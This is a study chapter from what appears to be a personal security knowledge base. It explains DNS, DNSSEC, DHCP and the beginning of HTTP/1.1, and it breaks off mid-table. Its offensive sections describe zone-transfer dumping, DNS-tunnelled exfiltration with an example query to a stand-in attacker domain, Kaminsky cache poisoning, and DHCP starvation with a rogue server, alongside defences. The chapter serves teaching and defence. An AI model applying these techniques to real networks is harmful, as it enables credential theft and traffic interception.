<!-- =========================================================================
   PROJECT: IW Cyber Ops — Knowledge Base (Intelligence Vault)
   AUTHOR: Muhammad Imran Wakeel | IW Cyber Ops (@iwcyberops)
   TRACK: 42-Month Systems & Cyber Operations Research
   MODULE: Month 02 — Network Protocols, Packet Dissection & Traffic Engineering
   DOCUMENT: Chapter 05 — Application Layer Protocols & TLS Architecture (Part 5.1)
   ========================================================================= -->

# 🌍 Chapter 05: Application Protocols & Cryptography (Part 5.1)

> **IW Cyber Ops Research Vault | Module 02: Network Protocols & Traffic Engineering**  
> *Author: Muhammad Imran Wakeel (@iwcyberops)*  
> *Track: RFC 1035 DNS Wire Specifications, Binary Headers, Record Types & Tunneling*

---

## 1. Domain Name System (DNS) Architecture & Hierarchy

The **Domain Name System (DNS — RFC 1034 / RFC 1035)** is an inverted, globally distributed, hierarchical database that resolves human-readable **Fully Qualified Domain Names (FQDN)** into machine-routable **IP Addresses** (and vice versa).

```
                                  [ ROOT ZONE: "." ]
                                  (13 Root Server Clusters: A.ROOT-SERVERS.NET to M)
                                           │
         ┌─────────────────────────────────┼─────────────────────────────────┐
         ▼                                 ▼                                 ▼
   [ gTLD: ".com" ]                  [ gTLD: ".org" ]                  [ ccTLD: ".pk" ]
         │                                 │                                 │
         ▼                                 ▼                                 ▼
 [ "target.com" Authoritative ]   [ "archive.org" Authoritative ]    [ "gov.pk" Authoritative ]
         │
         ▼
 [ Subdomain: "c2.target.com" ]
```

---

### Recursive vs Iterative Resolution Flow

```
 [ Local Host ] ──( 1. Recursive Query: "Where is target.com?" )──> [ Local Recursive Resolver ]
                                                                       (e.g., 8.8.8.8 / 1.1.1.1)
                                                                                   │
       ┌───────────────────────────────────────────────────────────────────────────┤
       │ 2. Iterative Query: "Where is target.com?"                                │
       ▼                                                                           │
 [ Root Name Server ] ──> Returns Referral: "Ask .com TLD at 192.5.6.30" ──────────┤
                                                                                   │
       ┌───────────────────────────────────────────────────────────────────────────┤
       │ 3. Iterative Query: "Where is target.com?"                                │
       ▼                                                                           │
 [ .com TLD Server ]  ──> Returns Referral: "Ask target.com NS at 203.0.113.53" ───┤
                                                                                   │
       ┌───────────────────────────────────────────────────────────────────────────┤
       │ 4. Iterative Query: "Where is target.com?"                                │
       ▼                                                                           │
 [ Authoritative NS ] ──> Returns Final ANSWER: "target.com A 93.184.216.34" ──────┘
       │
       ▼
 [ Local Resolver caches record & returns IP to Host ]
```

1. **Recursive Query (Client to Resolver):** The client offloads the entire resolution task to the recursive resolver. The resolver **must** return either the final IP or an error (`NXDOMAIN`).
2. **Iterative Query (Resolver to World):** The resolver queries servers step-by-step. If a server does not know the answer, it returns a **Referral (Delegation)** pointing to the next-hop authoritative name server down the tree.

---

## 2. DNS Binary Wire Format (RFC 1035 Dissection)

Every DNS message—whether query or response, UDP or TCP—shares an identical **Base Binary Structure**:

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         Transaction ID        |             Flags             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|       Questions Count         |      Answer Records Count     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|    Authority Records Count    |    Additional Records Count   |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                       Questions Section                       /
/                                                               /
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                    Answer Records Section                     /
/                                                               /
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                   Authority Records Section                   /
/                                                               /
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                   Additional Records Section                  /
/                                                               /
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
│ ◄──────────────── Fixed Header: Exactly 12 Bytes ───────────► │
```

---

### The 16-Bit Flags Register Breakdown

```text
 0   1   2   3   4   5   6   7   8   9  10  11  12  13  14  15
┌───┬───────────────┬───┬───┬───┬───┬───────────┬───────────────┐
│QR │    Opcode     │AA │TC │RD │RA │     Z     │     RCODE     │
└───┴───────────────┴───┴───┴───┴───┴───────────┴───────────────┘
```

| Flag Field | Bits | Function | Binary / Operational Values |
| :--- | :---: | :--- | :--- |
| **`QR`** | 1 Bit | **Query / Response Flag** | `0` = Query, `1` = Response |
| **`Opcode`** | 4 Bits | Query Type Specifier | `0` = Standard Query (`QUERY`), `1` = Inverse (`IQUERY`), `2` = Server Status |
| **`AA`** | 1 Bit | **Authoritative Answer** | `1` = Responding server is the official owner of the domain |
| **`TC`** | 1 Bit | **Truncated Response** | `1` = Message exceeded $512\text{ bytes}$; client must retry via **TCP Port 53** |
| **`RD`** | 1 Bit | **Recursion Desired** | `1` = Informs resolver to recursively resolve the domain |
| **`RA`** | 1 Bit | **Recursion Available**| `1` = Set by resolver to confirm it supports recursive lookups |
| **`Z`** | 3 Bits | Reserved | Must be `000` in standard queries (Used by DNSSEC) |
| **`RCODE`** | 4 Bits | **Response Return Code** | `0` = No Error (`NOERROR`)<br>`2` = Server Failure (`SERVFAIL`)<br>`3` = Non-Existent Domain (`NXDOMAIN`)<br>`5` = Refused (`REFUSED`) |

---

## 3. Wire Encoding: QNAME Labels & DNS Compression

### 1. The QNAME String Format (Length-Byte Encoding)
DNS does not use ASCII null-terminated strings or periods (`.`) on the wire. Domain names are encoded as a series of **Length-Prefixed Labels**:

$$\text{"c2.target.com"} \implies \mathbf{\backslash\text{x02 c 2 } \backslash\text{x06 t a r g e t } \backslash\text{x03 c o m } \backslash\text{x00}}$$

* `\x02` = Next label is 2 bytes long: `c2`.
* `\x06` = Next label is 6 bytes long: `target`.
* `\x03` = Next label is 3 bytes long: `com`.
* `\x00` = **Root Null Terminator (0x00):** Terminates the domain string.

---

### 2. DNS Pointer Compression (`0xC0` Offset)
To save bandwidth, when a domain name appears multiple times in a single packet (e.g., in the Question, Answer, and Authority sections), DNS replaces duplicate strings with a **2-byte Compression Pointer**:

```text
 1 1 0 0 0 0 0 0    0 0 0 1 1 1 0 0
├───────────────┼──────────────────┤
│ Magic: 0xC0   │ Pointer Offset:  │  ──> Points to Byte Offset 28 from the start
│ (Top 2 bits=1)│ 14 Bits (0x001C) │      of the DNS header where the name was first seen!
└───────────────┴──────────────────┘
```

> ⚠️ **The Top Two Bits Rule:** If a label length starts with binary `11` (`0xC0` in hex), the parser treats it as an in-memory byte offset pointer, **NOT** a literal string length.

---

### 3. Resource Record (RR) Structure

The Answer, Authority, and Additional sections use the **Resource Record (RR)** wire format:

```
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                        DNS RESOURCE RECORD (RR) SPECIFICATION                          │
├───────────────────────────────────────────┬────────────────────────────────────────────┤
│ NAME (Variable: Domain name or 2B Pointer)│ TYPE (2 Bytes: e.g., 0x0001 for 'A')       │
├───────────────────────────────────────────┼────────────────────────────────────────────┤
│ CLASS (2 Bytes: Always 0x0001 for IN/Net) │ TTL (4 Bytes: 32-Bit Cache Time-To-Live)   │
├───────────────────────────────────────────┴────────────────────────────────────────────┤
│ RDLENGTH (2 Bytes: Byte length of RDATA)  │ RDATA (Variable: The resolved record IP)   │
└───────────────────────────────────────────┴────────────────────────────────────────────┘
```

---

### Core DNS Record Types Reference Matrix

| Type | Hex | Type Name | Purpose & Stored RDATA Format |
| :---: | :---: | :--- | :--- |
| **`1`** | `0x0001` | **A** | Maps hostname to 32-bit IPv4 address (`93.184.216.34`) |
| **`28`**| `0x001C` | **AAAA**| Maps hostname to 128-bit IPv6 address (`2606:2800:220:1:248:...`) |
| **`5`** | `0x0005` | **CNAME** | Canonical Name (Alias mapping one domain to another domain) |
| **`15`**| `0x000F` | **MX** | Mail Exchange server (Includes a 16-bit Priority integer) |
| **`2`** | `0x0002` | **NS** | Authoritative Name Server for the delegated zone |
| **`16`**| `0x0010` | **TXT** | Text strings (Used for SPF, DKIM, DMARC, and C2 exfiltration) |
| **`6`** | `0x0006` | **SOA** | Start of Authority (Zone serial number, refresh/retry timers) |
| **`12`**| `0x000C` | **PTR** | Pointer Record (Reverse DNS: Maps IP to domain under `.in-addr.arpa`) |
| **`33`**| `0x0021` | **SRV** | Service Locator (Defines Port, Priority, Weight, Hostname) |

---

## 4. Transport Dynamics: UDP 53 vs TCP 53

```
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                        DNS TRANSPORT ARBITRATION MATRIX                                │
├───────────────────┬──────────────┬─────────────────────────────────────────────────────┤
│ Protocol          │ Port         │ Operational Condition                               │
├───────────────────┼──────────────┼─────────────────────────────────────────────────────┤
│ **UDP**           │ Port 53      │ Standard lookups where response payload $\le 512\text{ Bytes}$.│
├───────────────────┼──────────────┼─────────────────────────────────────────────────────┤
│ **TCP**           │ Port 53      │ 1. Truncated queries (**TC=1 Flag Set**).            │
│                   │              │ 2. **Zone Transfers (`AXFR` / `IXFR`)**.             │
│                   │              │ 3. DNSSEC responses exceeding standard MTU.         │
├───────────────────┼──────────────┼─────────────────────────────────────────────────────┤
│ **DoT (TLS)**     │ TCP 853      │ DNS over TLS: Encrypted DNS privacy channel.        │
│ **DoH (HTTPS)**   │ TCP 443      │ DNS over HTTPS: Encrypted queries over HTTP/2 HTTP/3│
└───────────────────┴──────────────┴─────────────────────────────────────────────────────┘
```

* **EDNS0 (RFC 6891 — Extension Mechanisms for DNS):** Overcomes the legacy 512-byte UDP limit by advertising an expanded client buffer size (e.g., $4096\text{ bytes}$) via an **OPT pseudo-record**, allowing large DNSSEC payloads without failing over to TCP.

---

## 5. 🔬 Raw Wire Hex Dissection: Live DNS Query

Below is an annotated hex dump of an actual raw DNS Query for `example.com` (Type A) captured via `tcpdump -xx`:

```text
1a 2b 01 00 00 01 00 00 00 00 00 00 07 65 78 61 6d 70 6c 65 03 63 6f 6d 00 00 01 00 01
```

```
 1a 2b │ 01 00 │ 00 01 │ 00 00 │ 00 00 │ 00 00 │ 07 65 78 61 6d 70 6c 65 03 63 6f 6d 00 │ 00 01 │ 00 01
 ──────┼───────┼───────┼───────┼───────┼───────┼────────────────────────────────────────┼───────┼───────
  TxID   Flags  QDCOUNT ANCOUNT NSCOUNT ARCOUNT  QNAME: [7]example[3]com[0]              QTYPE   QCLASS
(0x1a2b)(0x0100) (1 Q)   (0)     (0)     (0)     Encoded Label Stream                    (Type A)(IN=1)
```

* `1a 2b` $\longrightarrow$ Transaction ID: `0x1A2B` (Matched by the client in the reply).
* `01 00` $\longrightarrow$ Flags: `0x0100` (Binary: `0000 0001 0000 0000` $\implies$ **QR=0** [Query], **RD=1** [Recursion Desired]).
* `00 01` $\longrightarrow$ Questions Count: `1`.
* `00 00 ...` $\longrightarrow$ Answer, Authority, Additional Counts all `0`.
* `07 65 78 61 6d 70 6c 65` $\longrightarrow$ Length `7`, string: `example`.
* `03 63 6f 6d` $\longrightarrow$ Length `3`, string: `com`.
* `00` $\longrightarrow$ Root Domain Terminator (`\x00`).
* `00 01` $\longrightarrow$ QTYPE: `0x0001` (Type A — IPv4).
* `00 01` $\longrightarrow$ QCLASS: `0x0001` (Class IN — Internet).

---

## 6. Offensive Tradecraft & Cyber Operations

```
┌────────────────────────────────────────────────────────────────────────┐
│                   DNS ATTACK & EXPLOITATION TAXONOMY                   │
├──────────────────────────┬─────────────────────────────────────────────┤
│ 1. DNS Zone Transfer     │ Dumping full internal network topologies    │
│    (AXFR Exploitation)   │ via misconfigured Authoritative Name Servers│
│ 2. DNS Covert C2         │ Encoding stolen data / reverse shells inside│
│    Tunneling & Exfil     │ TXT / A query streams across restricted nets│
│ 3. Subdomain Bruteforce  │ High-speed dictionary mapping of hidden web │
│                          │ admin panels and staging portals            │
└──────────────────────────┴─────────────────────────────────────────────┘
```

---

### 1. DNS Full Zone Transfer Exploitation (`AXFR`)
* **Vulnerability:** Authoritative name servers use `AXFR` over **TCP Port 53** to replicate records to secondary servers. If an administrator fails to restrict transfers to authorized IPs, anyone can dump the **entire internal network infrastructure**:

```bash
# Attempt Full Zone Transfer using dig:
dig axfr @ns1.target.com target.com

# Returns 100% of internal hosts:
# target.com.         IN  SOA  ns1.target.com. admin.target.com. (...)
# dev-vpn.target.com. IN  A    10.10.14.5
# staging.target.com. IN  A    10.10.14.8
# secret.target.com.  IN  TXT  "internal-api-key-1337"
```

---

### 2. DNS Covert Tunneling & Exfiltration (Bypassing Air-Gaps)
* **Mechanics:** Many corporate firewalls block all outbound HTTP/HTTPS/SSH traffic, but **permit internal DNS queries to external resolvers**.
* **Exploitation:** Malware encodes stolen files into subdomains and queries its own malicious authoritative name server:
  ```text
  Client Query: aW1yYW4ucGFzc3dvcmQxMjM=.c2.attacker.com ──> Recursive Resolver ──> Attacker NS
  ```
* The attacker's authoritative server decodes the base64 subdomain string (`imran.password123`), capturing the data while completely bypassing perimeter firewalls!

---

## 7. Live DNS Diagnostics & Packet Inspection

```bash
# 1. Query Specific Record Types with Detailed Output via dig
dig target.com ANY +noall +answer

# 2. Trace Step-by-Step Iterative Resolution from Root Servers
dig target.com +trace

# 3. Reverse DNS Lookup (PTR Query)
dig -x 93.184.216.34 +short

# 4. Capture Live DNS Packets with Full Header Decode via tcpdump
sudo tcpdump -i eth0 -nn -vvv -s0 'udp port 53'

# 5. Extract Unique Queried Domains from Network Streams
sudo tcpdump -i eth0 -l -nn 'udp port 53' | awk '{print $NF}'
```

---

<!-- =========================================================================
   [IW CYBER OPS] - INTERNAL RESEARCH USE ONLY
   Repository: https://github.com/iwcyberops/IW-Knowledge-Base
   ========================================================================= -->

---

# 🌍 Chapter 05: Application Protocols & Cryptography (Part 5.2)

> **IW Cyber Ops Research Vault | Module 02: Network Protocols & Traffic Engineering**  
> *Author: Muhammad Imran Wakeel (@iwcyberops)*  
> *Track: Kaminsky DNS Cache Poisoning, DNSSEC Chains & DHCP Starvation MITM*

---

## 1. DNS Cache Poisoning & The Kaminsky Attack

**DNS Cache Poisoning** is the injection of forged, malicious IP mappings into a recursive resolver's in-memory cache. Once poisoned, all network clients querying the resolver are silently redirected to an attacker’s infrastructure.

```
       [ VICTIM RESOLVER: 192.168.1.1 ] ────────────────────────────────────────┐
              │                                                                 │
              │ 1. Queries Root/TLD for "target.com"                            │
              ▼                                                                 ▼
   [ LEGITIMATE AUTHORITATIVE NS ]                              [ ATTACKER MACHINE ]
   (Replies slowly with valid IP)                               (Floods 10,000 Forged Replies/sec)
              │                                                                 │
              │ ◄─── Arrives late (Dropped!)          Arrives First! ───────────┤
              │                                       "target.com is at ATTACKER_IP"
              ▼                                                                 ▼
   [ Cache Poisoned! All clients visiting target.com route to Attacker ] ◄──────┘
```

---

### The Classic Poisoning Flaw vs The Kaminsky Breakthrough

* **The Classic Attack Flaw:** If an attacker queried `target.com`, the resolver cached the legitimate IP for the duration of the record's **TTL (Time to Live)** (e.g., 24 hours). The attacker had only a **single fractional-second race-window** to guess the 16-bit Transaction ID. If they failed, they had to wait 24 hours for the cache to expire!
* **The Dan Kaminsky Breakthrough (2008):**  
  Kaminsky bypassed the TTL cache constraint entirely by querying **randomized non-existent subdomains**:

$$\text{Attacker Queries: } \mathbf{\text{random001.target.com}}, \quad \mathbf{\text{random002.target.com}}, \quad \mathbf{\text{random003.target.com}} \dots$$

```
   [ Attacker Queries: "random1337.target.com" ] ──> [ Target Resolver ]
                                                              │
                                                              ▼ (Resolver queries Authoritative NS)
   [ Attacker Floods 5,000 Spoofed Replies ]: ◄───────────────┘
   - Transaction ID: Brute-forced (0 to 65535)
   - Question: random1337.target.com
   - Authority Section (The Payload!):
       target.com.  IN  NS  ns.attacker.com.   ◄── GLUE RECORD INJECTION!
   - Additional Section:
       ns.attacker.com.  IN  A  10.10.14.5
```

1. Because `random1337.target.com` does not exist in the resolver's cache, the resolver is **forced to query the authoritative server every single time**.
2. When the attacker successfully guesses the 16-bit Transaction ID for one of the random subdomains, the resolver accepts the packet.
3. Crucially, the resolver does not just cache the answer; it parses the **Authority Section**, overwriting its root authoritative name server mapping for the **entire domain (`target.com`)** with the attacker's IP!
4. **Impact:** The attacker permanently seizes the entire domain zone without waiting for TTL expiration.

---

### Mathematical Probability & Entropy Defense

A forged DNS response must match two entropy parameters:
1. **Transaction ID (TXID):** 16 Bits ($2^{16} = 65,536\text{ values}$).
2. **UDP Source Port:** 16 Bits ($2^{16} = 65,536\text{ values}$).

$$\text{Combined Search Space} = 2^{16} \times 2^{16} = 2^{32} \approx \mathbf{4,294,967,296\text{ Combinations}}$$

* **Historical Vulnerability:** Early BIND implementations used static UDP source ports (Port 53), reducing the attack complexity down to only $65,536$ packets!
* **Source Port Randomization (SPR):** Modern resolvers allocate a cryptographically randomized UDP source port for every outbound query, rendering Kaminsky-style brute-forcing mathematically infeasible over standard networks.

---

## 2. Cryptographic Integrity: DNSSEC Architecture

Standard DNS has zero authentication; **DNSSEC (DNS Security Extensions — RFC 4033 / 4034 / 4035)** adds **Public-Key Cryptography** to verify the origin authenticity and integrity of DNS records.

> ⚠️ **Critical Reality:** **DNSSEC does NOT encrypt DNS traffic.** Data remains plain-text; DNSSEC solely proves that the data was not tampered with in transit.

```
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                        CORE DNSSEC RESOURCE RECORD (RR) TYPES                          │
├─────────────┬──────────────────────────────────────────────────────────────────────────┤
│ **RRSIG**   │ **Resource Record Signature:** Digital cryptographic signature (RSA/ECDSA│
│             │ wrapping an RRset (e.g., the signature verifying an 'A' record).         │
├─────────────┼──────────────────────────────────────────────────────────────────────────┤
│ **DNSKEY**  │ Public Key Record. Hosts the **ZSK** (Zone-Signing Key) and **KSK**      │
│             │ (Key-Signing Key) used to validate RRSIG signatures.                     │
├─────────────┼──────────────────────────────────────────────────────────────────────────┤
│ **DS**      │ **Delegation Signer:** Cryptographic SHA-256 hash of the child zone's KSK│
│             │ stored inside the parent zone (Creates the cryptographic **Chain of Trust│
├─────────────┼──────────────────────────────────────────────────────────────────────────┤
│ **NSEC /**  │ **Authenticated Denial of Existence:** Cryptographically proves that a   │
│ **NSEC3**   │ queried subdomain does NOT exist, preventing forged NXDOMAIN responses.  │
└─────────────┴──────────────────────────────────────────────────────────────────────────┘
```

---

### The Hierarchical Chain of Trust

```
  [ ICANN ROOT ZONE: "." ] ──> Holds Root KSK (Globally trusted Trust Anchor)
             │
             ▼ (Root signs DS record for .com)
  [ gTLD ZONE: ".com" ]    ──> Validates parent DS; signs DS record for target.com
             │
             ▼ (TLD signs DS record for target.com)
  [ AUTHORITATIVE: "target.com" ] ──> Signs zone A records with ZSK (Validated by Resolver!)
```

---

## 3. Dynamic Host Configuration Protocol (RFC 2131)

**DHCP** dynamically assigns IP addresses, subnet masks, default gateways, and DNS resolvers to unconfigured endpoint hosts connecting to a Layer 2 network.

* **Transport:** UDP. **Server listens on Port 67**; **Clients listen on Port 68**.

```
       [ UNCONFIGURED CLIENT: 0.0.0.0 ]                    [ DHCP SERVER: 192.168.1.1 ]
                      │                                                │
                      │ 1. DHCPDISCOVER (Layer 2 & Layer 3 Broadcast)  │
                      │    Src: 0.0.0.0:68 ──> Dest: 255.255.255.255:67│
                      ├───────────────────────────────────────────────►│
                      │                                                │
                      │ 2. DHCPOFFER (Unicast / Broadcast)             │
                      │    Offered IP: 192.168.1.50, Lease: 86400s     │
                      │◄───────────────────────────────────────────────┤
                      │                                                │
                      │ 3. DHCPREQUEST (Broadcast to notify all servers│
                      │    "I accept 192.168.1.50 from 192.168.1.1")   │
                      ├───────────────────────────────────────────────►│
                      │                                                │
                      │ 4. DHCPACK (Final Confirmation & Parameters)   │
                      │    Gateway: 192.168.1.1, DNS: 1.1.1.1          │
                      │◄───────────────────────────────────────────────┤
                      ▼                                                ▼
              [ Client Configured ]                             [ IP Bound ]
```

---

### 🔬 The DHCP Packet Wire Architecture (240+ Bytes)

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|   Op (1B)     |  HType (1B)   |   HLen (1B)   |   Hops (1B)   |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                       Transaction ID (XID)                    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         Secs (2B)             |         Flags (2B)            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                          ciaddr (Client IP)                   |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                          yiaddr ("Your" Allocated IP)         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                          siaddr (Next Server IP)              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                          giaddr (Relay Agent IP)              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
|                  chaddr (Client Hardware MAC: 16 Bytes)       |
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                   sname (Server Hostname: 64 Bytes)           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                     file (Boot Filename: 128 Bytes)           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                Magic Cookie (4 Bytes: 0x63 0x82 0x53 0x63)    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                     Options (Variable Length)                 |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

* **Opcode:** `1` = BootRequest (Client), `2` = BootReply (Server).
* **`yiaddr` ("Your IP"):** The IP address the server is allocating to the client.
* **`chaddr`:** The physical MAC address of the requesting client.
* **The Magic Cookie:** Fixed 4-byte marker `0x63 0x82 0x53 0x63` signaling the start of dynamic options.
* **Core DHCP Options:**
  * **Option 53 (Message Type):** `1` = Discover, `2` = Offer, `3` = Request, `5` = ACK, `6` = NAK.
  * **Option 1:** Subnet Mask (`255.255.255.0`).
  * **Option 3:** Router / Default Gateway IP.
  * **Option 6:** Domain Name Servers (DNS IPs).

---

## 4. DHCP Offensive Vectors: Starvation & Rogue Server MITM

```
┌────────────────────────────────────────────────────────────────────────┐
│                        DHCP ATTACK TAXONOMY                            │
├──────────────────────────┬─────────────────────────────────────────────┤
│ 1. DHCP Starvation       │ Exhausts all available IP leases in the     │
│                          │ server pool via forged MAC requests         │
│ 2. Rogue DHCP Server     │ Deploys unauthorized server providing rogue │
│                          │ Gateway and DNS parameters (Full MITM)      │
└──────────────────────────┴─────────────────────────────────────────────┘
```

---

### Step 1: The DHCP Starvation Attack
* **Mechanics:** An attacker connects to the local switch and uses automated packet generation tools (`dhcpstarv`, Scapy, Yersinia) to flood thousands of **DHCPDISCOVER** requests per second.
* **The Trick:** Each request features a **randomized, unique Client Hardware Address (`chaddr`)**.
* **Result:** The legitimate DHCP server allocates an IP lease for every spoofed MAC until its entire dynamic scope pool is completely exhausted. Legitimate new endpoints connecting to the network receive zero IP addresses.

---

### Step 2: The Rogue DHCP Server Deployment (Man-in-the-Middle)
Once the legitimate server is starved, the attacker launches a rogue DHCP service:
1. A legitimate user connects and broadcasts a `DHCPDISCOVER`.
2. The attacker's rogue server responds instantly with a `DHCPOFFER`:
   * Assigned IP: Valid network IP.
   * **Default Gateway (Option 3):** Set to the **Attacker’s IP**.
   * **DNS Server (Option 6):** Set to the **Attacker’s IP**.
3. **Impact:** The victim accepts the parameters. All corporate Internet traffic and DNS queries now route directly through the attacker's machine, enabling transparent sniffing, credential capture, and payload injection.

---

### 🛡️ Defensive Hardening: DHCP Snooping

To neutralize DHCP attacks, enterprise switches implement **DHCP Snooping**:

```
 [ UNTRUSTED ACCESS PORTS (Clients) ]                 [ TRUSTED TRUNK PORT (DHCP Server) ]
 ┌───────────────────────────────────┐               ┌────────────────────────────────────┐
 │ Drops all DHCPOFFER and DHCPACK   │               │ Allows DHCP Server Responses       │
 │ packets! Rogue servers neutralized│               │ Passes DORA exchange cleanly       │
 └───────────────────────────────────┘               └────────────────────────────────────┘
```

* **DHCP Snooping Table:** The switch inspects legitimate DHCP traffic on untrusted ports and logs a cryptographic binding database: `[MAC Address, IP Address, Lease Time, VLAN, Switchport]`. This database powers **Dynamic ARP Inspection (DAI)** to block ARP spoofing!

---

## 5. Live Protocol Diagnostics & Lab Verification Matrix

```bash
# 1. Capture Raw DHCP Transactions via tcpdump
sudo tcpdump -i eth0 -nn -vvv -s0 'port 67 or port 68'

# 2. Audit DNSSEC Validation Flags using dig (+dnssec)
dig target.com +dnssec
# Inspect Header Flags: 'ad' flag (Authenticated Data) confirms cryptographically valid signature!

# 3. Inspect DNSSEC Records (RRSIG and DNSKEY)
dig target.com RRSIG +short
dig target.com DNSKEY +multi

# 4. Release and Re-Request Local DHCP Lease via Linux CLI
sudo dhclient -r eth0   # Release active lease (Transmits DHCPRELEASE)
sudo dhclient -v eth0   # Obtain fresh lease (Runs full DORA handshake)
```

---

<!-- =========================================================================
   [IW CYBER OPS] - INTERNAL RESEARCH USE ONLY
   Repository: https://github.com/iwcyberops/IW-Knowledge-Base
   ========================================================================= -->

---

# 🌍 Chapter 05: Application Protocols & Cryptography (Part 5.3)

> **IW Cyber Ops Research Vault | Module 02: Network Protocols & Traffic Engineering**  
> *Author: Muhammad Imran Wakeel (@iwcyberops)*  
> *Track: RFC 7230 HTTP/1.1 Wire Stream, Chunked Framing, Security Headers & Request Smuggling*

---

## 1. The HTTP/1.1 Wire Stream Architecture (RFC 7230 / RFC 9112)

The **Hypertext Transfer Protocol (HTTP/1.1)** is a stateless, application-level, text-based client-server request/response protocol operating over a reliable transport layer (typically TCP Port 80, or TLS-encrypted TCP Port 443).

```
               [ HTTP/1.1 REQUEST STREAM ]                           [ HTTP/1.1 RESPONSE STREAM ]
  ┌──────────────────────────────────────────────────┐   ┌──────────────────────────────────────────────────┐
  │ GET /api/v1/auth HTTP/1.1\r\n                    │   │ HTTP/1.1 200 OK\r\n                              │
  ├──────────────────────────────────────────────────┤   ├──────────────────────────────────────────────────┤
  │ Host: target.com\r\n                             │   │ Date: Mon, 25 Aug 2026 12:00:00 GMT\r\n          │
  │ User-Agent: Mozilla/5.0...\r\n                   │   │ Server: nginx\r\n                                │
  │ Accept: application/json\r\n                     │   │ Content-Type: application/json\r\n               │
  │ Content-Length: 0\r\n                            │   │ Content-Length: 34\r\n                           │
  ├──────────────────────────────────────────────────┤   ├──────────────────────────────────────────────────┤
  │ \r\n (Empty Line / CRLF Header Delimiter)        │   │ \r\n (Empty Line / CRLF Header Delimiter)        │
  ├──────────────────────────────────────────────────┤   ├──────────────────────────────────────────────────┤
  │ [ Optional Request Body Payload ]                │   │ {"status":"authenticated","uid":1001}            │
  └──────────────────────────────────────────────────┘   └──────────────────────────────────────────────────┘
```

---

### The Fundamental CRLF Delimiter (`\r\n`)

HTTP/1.1 message parsing relies strictly on the **CRLF (Carriage Return + Line Feed)** sequence:

$$\mathbf{\backslash\text{r}\backslash\text{n}} \implies \text{Hex: } \mathbf{0x0D \ 0x0A} \implies \text{ASCII: } 13 \ 10$$

1. **Start-Line / Request-Line:** Contains `<Method> <Request-Target> <HTTP-Version>\r\n`.
2. **Status-Line (Response):** Contains `<HTTP-Version> <Status-Code> <Reason-Phrase>\r\n`.
3. **Header Fields:** Each header consists of a case-insensitive field name, followed by a colon (`:`), optional leading whitespace, the field value, and terminates with `\r\n`.
4. **Header Block Terminator:** The transition between headers and the message body is marked by **two consecutive CRLFs**:

$$\mathbf{\backslash\text{r}\backslash\text{n}\backslash\text{r}\backslash\text{n}} \implies \text{Hex: } \mathbf{0x0D \ 0x0A \ 0x0D \ 0x0A}$$

* Any bytes following the double CRLF are parsed as **Message Body Payload**.

---

## 2. HTTP Methods & Status Code Taxonomy

### HTTP Methods Architecture

```
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                        HTTP/1.1 CORE METHODS SPECIFICATION                            │
├─────────┬──────────────┬───────────────┬───────────────────────────────────────────────┤
│ Method  │ Safe (RFC)?  │ Idempotent?   │ Operational / Attack Surface Context          │
├─────────┼──────────────┼───────────────┼───────────────────────────────────────────────┤
│ **GET** │ ✅ **Yes**   │ ✅ **Yes**    │ Retrieves resources; MUST NOT alter server    │
│         │              │               │ state. Payload parameters leak in URL logs!   │
├─────────┼──────────────┼───────────────┼───────────────────────────────────────────────┤
